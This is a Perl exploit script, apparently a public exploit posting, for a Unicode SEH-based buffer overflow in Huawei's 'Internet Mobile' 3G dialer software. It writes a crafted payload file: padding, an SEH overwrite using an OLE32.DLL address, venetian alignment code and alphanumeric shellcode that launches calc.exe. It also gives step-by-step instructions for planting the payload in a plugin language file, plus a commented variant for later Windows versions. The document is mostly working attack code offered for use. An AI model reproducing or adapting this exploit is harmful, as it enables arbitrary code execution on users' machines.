#!/usr/bin/perl
# Title : Huawei Technologies - Internet Mobile 0day Unicode SEH Based Vulnerability .
# Author : Dark-Puzzle
# Versions : All Versions Are Vulnerable , The behavior of the program when exploiting may vary from an OS to another OS .
# Vulnerable By Vendor : Morocco - Meditel 3G & Maroc Telecom 3G .
# RISK : Critical .
# Type : Local / Remote.
######################################################
# Video : https://www.youtube.com/watch?v=pkOaPQJPQbE (Windows XP SP1 + Windows 7 )
#####################################################
#---------------------------------------------------------------------
# Use it at your own risk #
###---------------------------------------------------------------------
# Info : This exploit works only on WinXP SP1 because it is almost impossible to execute it on Win7 & WinXP SP2/SP3 cause This program has been compiled with SafeSEH enabled .
# So in other versions of Windows you will not find any valid UNICODE addresses (No SafeSEH) neither in OS modules nor in Program Modules .
# That's why I Will give you just an Idea about Win7 XP Sp1/Sp2. ( Look DOWN ) !
# Anyway this exploit works perfectly on Windows XP SP1 .
# Here it is , the video explain the usage =) :  http://www.youtube.com/watch?v=pkOaPQJPQbE (Windows XP SP1 + Windows 7 )
###

# How to use this exploit On Windows XP SP1 . watch my video : 
# So first go to C:\program files\Internet Mobile\plugins\SMSUIPlugin\SMSUIPlugin_fr-fr.lang or _en-fr.lang (according to the program language)
# Then put the output of this perl program  in <item name="IDS_PLUGIN_NAME">HERE !!</item> . Save it open the program .
# Not like Win7 & WinXP SP2/SP3 this exploit requires you to click from the to menu "Operation" --> "Message texte" !! Bingo . Calc.exe Just Showed Up =) .
#                                                                               English :"Operation" --> "Text Message"

my $size = 43680;                                                        
my $junk = "A" x 146 ;
my $nseh = "\x61\x62"; # Popad + Align .
my $seh  = "\x88\xDC"; # p/p/r From OLE32.DLL ( Windows XP SP1 Only)
# The Venetian Shellcode : 
my $ven = 
"\x6e". # Align Code
"\x53". # push ebx
"\x6e". # Align Code
"\x58". # pop eax
"\x6e". # Align Code
"\x05\x17\x11". # add eax, 0x11001700
"\x6e". # Align Code
"\x2d\x16\x11". # sub eax, 0x11001600
"\x6e". # Align Code
"\x50". # push eax
"\x6e". # Align Code
"\xc3"; # ret

my $more = "D" x 108 ; # Exact Value To Make the Venetian shellcode work.

# CALC.exe Shellcode .
my $shellcode =
"PPYAIAIAIAIAQATAXAZAPA3QADAZA".
"BARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA".
"58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABAB".
"AB30APB944JBKLK8U9M0M0KPS0U99UNQ8RS44KPR004K".
"22LLDKR2MD4KCBMXLOGG0JO6NQKOP1WPVLOLQQCLM2NL".
"MPGQ8OLMM197K2ZP22B7TK0RLPTK12OLM1Z04KOPBX55".
"Y0D4OZKQXP0P4KOXMHTKR8MPKQJ3ISOL19TKNTTKM18V".
"NQKONQ90FLGQ8OLMKQY7NXK0T5L4M33MKHOKSMND45JB".
"R84K0XMTKQHSBFTKLL0KTK28MLM18S4KKT4KKQXPSYOT".
"NDMTQKQK311IQJPQKOYPQHQOPZTKLRZKSVQM2JKQTMSU".
"89KPKPKP0PQX014K2O4GKOHU7KIPMMNJLJQXEVDU7MEM".
"KOHUOLKVCLLJSPKKIPT5LEGKQ7N33BRO1ZKP23KOYERC".
"QQ2LRCM0LJA"; 


my $morestuff = "D" x ( 43680 - length($junk.$nseh.$seh));
$payload = $junk.$nseh.$seh.$ven.$more.$shellcode.$morestuff;
open (myfile,'>mobile.txt');
print myfile $payload;
close(myfile);
print "This Program has written ".length($payload)." bytes\n";

##########################################################
# For Windows XP SP 2 / SP 3 and Windows 7 32/64 bits        Remove the Upper script and # in each script line .
##########################################################
# When Changing the value of <item name="IDS_PLUGIN_NAME"></item> the program crashes directly when it is opened and act differently than WinXP SP1 .

#my $totalsize = 43680 ;
#my $junk = "A" x 182 ;
#my $nseh = "\x42\x42"; # Overwriting the pointer to next SEH with 0x42004200
#my $seh = "\x43\x43";  # Overwriting SEH with 0x43004300
#my $morestuff = "D" x ( 43680-length($junk.$nseh.$seh));

#$payload= $junk.$nseh.$seh.$morestuff;
#open(myfile,'>mobile.txt');
#print myfile $payload;
#close(myfile);
#print "Wrote ".length($payload)." bytes\n";

#############################################################